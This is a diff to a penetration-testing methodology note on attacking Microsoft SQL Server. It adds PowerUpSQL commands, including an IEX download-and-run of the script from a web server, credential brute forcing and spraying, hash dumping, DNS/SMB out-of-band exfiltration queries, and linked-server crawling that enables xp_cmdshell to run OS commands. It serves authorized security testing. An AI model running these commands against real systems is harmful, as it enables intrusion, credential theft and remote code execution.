@@ -1,51 +1,83 @@
 # Microsoft SQL Server (MSSQL) - Methodology
 
-### MSSQL instances discovery
+### PowerUpSQL
 
-If Active Directory domain credentials are known, a list of the domain service
-accounts referencing in their `ServicePrincipalName (SPN)` a MSSQL service
-can be requested in order to identify the MSSQL instances, that make use of the
-Kerberos authentication protocol, within the domain. As the SPN for service
-accounts follow the naming convention `<SERVICE>/<HOST>`, SPN starting with
-`MSSQL` are linked to MSSQL instances.
+[`PowerUpSQL`](https://github.com/NetSPI/PowerUpSQL) is a PowerShell framework
+that implement cmdlets to discover, enumerate, and exploit `SQL server`
+instances. A number of usage of the `PowerUpSQL` PowerShell cmdlets presented in this note are inspired from the [PowerUpSQL Cheat
+Sheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet).
 
-The `PowerShell` cmdlets `Get-ADUser`, of the Active Directory module for
-`PowerShell` and `Get-SQLInstanceDomain`, of the `PowerUpSQL` suite, can be used
-to conduct the search:
+`PowerUpSQL` can be installed / imported in a number of ways:
 
-```ruby
-# List the SPN containing "MSSQL" to detect if any abnormality is present in any SPN naming
-Get-ADObject -Filter { servicePrincipalName -like "*MSSQL*" } -Properties servicePrincipalName | Select-Object SamAccountName,servicePrincipalName
+```bash
+# Permanently installs the framework from the PowerShell Gallery on the local system (requires local administrative privileges).
+Install-Module -Name PowerUpSQL
 
-# List the hostname specified in the SPNs referencing a MSSQL service
-Get-ADObject -Filter { servicePrincipalName -like "MSSQL*" } -Properties servicePrincipalName | Select -Expand servicePrincipalName | Where { $_ -like "MSSQL*" } | ForEach { $_.split('/')[1] }
+# Imports the module in the current PowerShell session (to be executed in the project directory).
+Import-Module PowerUpSQL.psd1
 
-# Using credentials from another domain
-$secpasswd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
-$creds = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNAME>", $secpasswd)
-Get-ADObject -Server <DC_IP> -Credential $creds -Filter { servicePrincipalName -like "MSSQL*" } -Properties servicePrincipalName | Select -Expand servicePrincipalName | Where { $_ -like "MSSQL*" } | ForEach { $_.split('/')[1] }
+# Inject the PowerShell script in memory (for the current PowerShell session only).
+IEX (Get-Content -Raw PowerUpSQL.ps1)
 
-# Use the current user login (NTLM / Kerberos tickets)
-Get-SQLInstanceDomain -Verbose
-
-# Using credentials from another domain
-runas /noprofile /netonly /user:<DOMAIN>\<USERNAME> PowerShell.exe
-import-module PowerUpSQL.psd1
-Get-SQLInstanceDomain -Verbose -DomainController <DC_IP> -Username <DOMAIN>\<USERNAME> -password <PASSWORD>
+IEX(New-Object System.Net.WebClient).DownloadString("http://<WEBSERVER_IP>/PowerUpSQL.ps1")
+IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1")
 ```
 
-`nmap` can be used to scan the network for exposed MSSQL databases:
+### MSSQL instances discovery
+
+###### Through network scans
+
+`nmap` can be used to scan the network for exposed `MSSQL` instances:
 
 ```bash
 nmap -v -p 1433 -sV -sC -oA nmap_mssql <RANGE | CIDR>
 ```
 
-### Service recon
+###### On the current subnet broadcast domain
+
+The `PowerUpSQL`'s `Get-SQLInstanceBroadcast` PowerShell cmdlet can be used to
+discover `MSSQL` instances on the current local network subnet `broadcast
+domain` using the `System.Data.Sql.SqlDataSourceEnumerator` class (and an `UPD`
+broadcast request).
+
+```bash
+# -UDPPing: if set, additional information will be retrieved through a direct UDP request to the SQL Server Browser service of the discovered instances.
+Get-SQLInstanceBroadcast [-UDPPing] -Verbose
+```
+
+###### Using Active Directory credentials
+
+If Active Directory domain credentials are known, a list of the domain service
+accounts referencing in their `ServicePrincipalName (SPN)` a `MSSQL` service
+can be requested in order to identify the `MSSQL` instances, that make use of
+the `Kerberos` authentication protocol, within the domain. As the `SPN` for
+service accounts follow the naming convention `<SERVICE>/<HOST>`, `SPN`
+starting with `MSSQL` are linked to `SQL Server` instances.
+
+The `PowerShell` cmdlets `Get-ADUser`, of the `Active Directory` module for
+`PowerShell` and `Get-SQLInstanceDomain`, of the `PowerUpSQL` suite, can be
+used to conduct the search:
+
+```ruby
+# Lists the SamAccountName and SPN of accounts whose SPN contains "MSSQL*".
+Get-ADObject -Filter { servicePrincipalName -like "*MSSQL*" } -Properties servicePrincipalName | Select-Object SamAccountName,servicePrincipalName
+
+# Extracts the hostname referenced in the SPNs containing "MSSQL*".
+Get-ADObject -Filter { servicePrincipalName -like "MSSQL*" } -Properties servicePrincipalName | Select -Expand servicePrincipalName | Where { $_ -like "MSSQL*" } | ForEach { $_.split('/')[1] }
+
+# Uses the current security context or the specified credentials to enumerate the SQL servers of the AD domain (Service Principal Name matching "MSSQL*").
+Get-SQLInstanceDomain -Verbose
+
+runas /noprofile /netonly /user:<DOMAIN>\<USERNAME> powershell.exe
+Get-SQLInstanceDomain -Verbose -DomainController <DC_IP> -Username <DOMAIN>\<USERNAME> -password <PASSWORD>
+```
+
+###### Through the SQL Server Browser service (in black box)
 
 The `nmap` `MSSQL-info.nse` script attempts to determine configuration and
-version information for Microsoft SQL Server.  
-The script will first gather information by querying the SQL Server Browser
-service (that runs by default on UDP port 1434 and provides imprecise
+version information from `SQL Server` instances.
+The script will first gather information by querying the `SQL Server Browser`
+service (that runs by default on `UDP` port 1434 and provides imprecise
 version information) and then sending a probe to the instance to conduct
 response packet analysis.
 
@@ -74,20 +106,54 @@ nmap -v -sT -p 1433 --script=MSSQL-empty-password.nse <HOSTS>
 
 ###### Authentication brute force
 
-The `Metasploit` `auxiliary/scanner/mssql/mssql_login` module can be used to
-brute force credentials for the service. The "BLANK_PASSWORDS" option is worth
-setting to "true".  
-
-The `patator` tool can be used as well to brute force credentials on the
-service:
+The `Metasploit`'s `auxiliary/scanner/mssql/mssql_login` module and `patator`
+can be used to brute force credentials for the service.
 
 ```bash
 patator mssql_login host=<IP> user=FILE0 password=FILE1 0=<WORDLIST_USER> 1=<WORDLIST_PASSWORD> -x ignore:fgrep='Login failed for user'
 
+# The `BLANK_PASSWORDS` option is worth setting to "true".
 msf > use auxiliary/scanner/mssql/mssql_login
 ```
 
-### Data retrival
+Alternatively, `PowerUpSQL`'s `Get-SQLServerLoginDefaultPw` PowerShell cmdlet
+can be used to test if the targeted `SQL Server` instance(s) are configured to
+accept (50+) **known default passwords**:
+
+```
+Get-SQLServerLoginDefaultPw -Verbose -Instance '<INSTANCE>'
+
+# Enumerates the SQL servers of the AD domain (Service Principal Name matching "MSSQL*") and attempt the bruteforce of default credentials.
+Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw -Verbose
+Get-SQLInstanceDomain -DomainController <DC_IP> -Username <DOMAIN>\<USERNAME> -Password <PASSWORD> | Get-SQLServerLoginDefaultPw -Verbose
+```
+
+###### Authentication spraying
+
+A combination of the `PowerUpSQL`'s `Get-SQLInstanceDomain` and `Get-SQLConnectionTestThreaded` PowerShell cmdlets can be used to:
+  - first enumerate the `SQL Server` instances of an `Active Directory` domain
+  - then attempt authentication using the current security context or the
+    specified (local or windows) credentials on the discovered instances.
+
+The `Get-SQLInstanceDomain` cmdlet can be replaced by the
+`Get-SQLInstanceBroadcast` cmdlet to attempt spraying over the `SQL server`
+instances of the local subnet.
+
+```bash
+# Enumerates the SQL server instances and attempt an authentication using the specified credentials.
+Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads <15 | THREAD_NUMBER> -username <USERNAME> -password <PASSWORD> | Where-Object {$_.Status -like "Accessible"}
+
+# Enumerates the SQL server instances and attempt an authentication using the current security context.
+Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads <15 | THREAD_NUMBER> | Where-Object {$_.Status -like "Accessible"}
+
+# Enumerates the SQL server instances and attempt an authentication using the specified domain credentials.
+runas /noprofile /netonly /user:<DOMAIN>\<USERNAME> powershell.exe
+Get-SQLInstanceDomain -Verbose -Username '<DOMAIN>\<USERNAME>' -Password '<PASSWORD>' -DomainController <DC_IP> | Get-SQLConnectionTestThreaded -Verbose -Threads <15 | THREAD_NUMBER>
+```
+
+### Information gathering and data retrieval
+
+###### Interactive command line MSSQL clients
 
 The `sqsh` Linux utility as well as the `impacket` Python script
 `mssqlclient.py` can be used to make queries to the database:
@@ -105,9 +171,19 @@ mssqlclient.py -windows-auth -db <DB_NAME> <DOMAIN | WORKGROUP>/<USERNAME>:<PASS
 mssqlclient.py -k -dc-ip <DC_IP> -db <DB_NAME> <DOMAIN | WORKGROUP>/<USERNAME>:<PASSWORD>@<HOSTNAME | IP>
 ```
 
+###### Graphical user interface MSSQL clients
+
 The `DBeaver` GUI tool can be used to simply access the database content
 through a graphical interface without the need to know the underlying MSSQL
 query syntax.
+
+###### Automated authenticated reconnaissance
+
+```bash
+Get-SQLServerInfo -Verbose -Instance <INSTANCE>
+
+Invoke-SQLDumpInfo -Verbose -Instance <INSTANCE>
+```
 
 ###### Basic data retrieval queries
 
@@ -131,9 +207,9 @@ query syntax.
 ###### Dump hashes
 
 If provided with an user credentials of appropriate DB privileges, the `nmap`
-NSE script `MSSQL-dump-hashes.nse` can be used to dump the password hashes
-from an MSSQL server in a format suitable for cracking by tools such as
-`John-the-ripper`.
+`NSE` script `MSSQL-dump-hashes.nse` can be used to dump the password hashes
+from an `MSSQL` instance in a format suitable for cracking by tools such as
+`John-the-ripper` / `hashcat`.
 
 ```bash
 nmap -v -sT -p <PORT> --script=MSSQL-dump-hashes.nse --script-args='mssql.username=<USERNAME>,mssql.password=<PASSWORD>' <IP>
@@ -145,7 +221,6 @@ nmap -v -sT -p <PORT> --script=MSSQL-dump-hashes.nse --script-args='mssql.userna
 |-------------|---------|
 | DNS request | `SELECT LOAD_FILE(concat('\\\\', (<SELECT_QUERY_ONE_ROW_RESULT>), '.<HOSTNAME>\\'))` |
 | SMB request | `SELECT <...> INTO OUTFILE '\\<HOSTNAME>\<SMB_SHARE>\<OUTPUT_FILE>'` |
-| HTTP request | X |
 
 ### Privileges escalation
 
@@ -430,6 +505,8 @@ that outgoing RPC connections, `RPC Out`, need to be enabled on the link to
 conduct reconfiguration operations to enable `xp_cmdshell` on the linked
 instance.
 
+###### Discovery and exploitation
+
 The `OPENQUERY` and  `EXEC [...] AT` functions can be used to execute SQL
 statements on the specified linked server. Note that the statement executed by
 `OPENQUERY` must return a value, so a `SELECT 1;` is needed for otherwise
@@ -467,17 +544,37 @@ EXEC ('EXEC (''CREATE LOGIN <USERNAME> WITH PASSWORD = ''''<PASSWORD>'''''') AT 
 EXEC ('EXEC (''EXEC master.dbo.sp_addsrvrolemember ''''<USERNAME>'''',''''sysadmin'''''') AT [<HOSTNAME2 | IP2>\<INSTANCE2>];') AT [<HOSTNAME1 | IP1>\<INSTANCE1>]
 
 -- xp_cmdshell
-EXEC ('EXEC (''xp_cmdshell ''''<CMD>'''''') AT [<HOSTNAME2 | IP2>\<INSTANCE2>];') AT [<HOSTNAME1 | IP1>\<INSTANCE1>]
 EXEC ('xp_cmdshell ''<CMD>''') AT [<HOSTNAME1 | IP1>\<INSTANCE1>]
+EXEC ('EXEC (''xp_cmdshell ''''<CMD>'''''') AT [<HOSTNAME2 | IP2>\<INSTANCE2>];') AT [<HOSTNAME1 | IP1>\<INSTANCE1>]
 SELECT * FROM OPENQUERY("[<HOSTNAME | IP>\<INSTANCE>]",'EXEC master..xp_cmdshell ''<CMD>''')
 -- SELECT 1 must be added if the command executed through xp_cmdshell does not return any result
 SELECT * FROM OPENQUERY("[<HOSTNAME | IP>\<INSTANCE>]",'SELECT 1; EXEC master..xp_cmdshell ''<CMD>''')
 SELECT * FROM OPENQUERY("[<HOSTNAME1 | IP1>\<INSTANCE1>]", 'SELECT * FROM OPENQUERY("[<HOSTNAME2 | IP2>\<INSTANCE2>]", ''xp_cmdshell whoami;'')');
 ```
 
-The `Metasploit` module `exploit/windows/mssql/mssql_linkcrawler` can be used
-to automatically and recursively crawl the configured server links and deploy
-payloads if the `DEPLOY` is set to `True`:
+The `PowerUpSQL`'s `Get-SQLServerLinkCrawl` PowerShell cmdlet can
+be used to automate the discovery and exploitation process detailed above:
+
+```bash
+# Lists and retrieves information (link name, is_data_access_enabled / is_rpc_out_enabled, etc.) on the database links of the specified instance.
+Get-SQLServerLink -Verbose -Instance "<INSTANCE>"
+
+# Recursively enumerates the database links of the specified instance (and displays if sysadmin privileges are granted on the linked instance(s)).
+Get-SqlServerLinkCrawl -Instance "<INSTANCE>"
+
+# Executes the given SQL query on all the database(s) linked to the specified instance.
+Get-SQLServerLinkCrawl -Instance "<INSTANCE>" -Query "<SELECT @@version | SQL_QUERY>"
+
+# Leverages sysadmin privileges on the linked databse to enable xp_cmdshell.
+Get-SQLServerLinkCrawl -Instance "<INSTANCE>" -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT "<LINKED_INSTANCE>"'
+
+# Executes an operating system command using xp_cmdshell on all the linked database (requires sufficient privileges and xp_cmdshell to be enabled).
+Get-SQLServerLinkCrawl -Instance "<INSTANCE>" -Query 'exec master..xp_cmdshell ''<OS_COMMAND>'''
+```
+
+Additionally, the `Metasploit` module `exploit/windows/mssql/mssql_linkcrawler`
+can be used to automatically and recursively crawl the configured server links
+and deploy payloads if the `DEPLOY` is set to `True`:
 
 ```
 msf> use exploit/windows/mssql/mssql_linkcrawler
@@ -505,6 +602,9 @@ The following query can be used to manually activate it given the account used
 has sufficient privilege (sysadmin):
 
 ```SQL
+-- Checks if xp_cmdshell is enabled (config_value = 1).
+EXEC sp_configure 'xp_cmdshell';
+
 -- To allow advanced options to be changed.  
 EXEC sp_configure 'show advanced options', 1;  
 GO
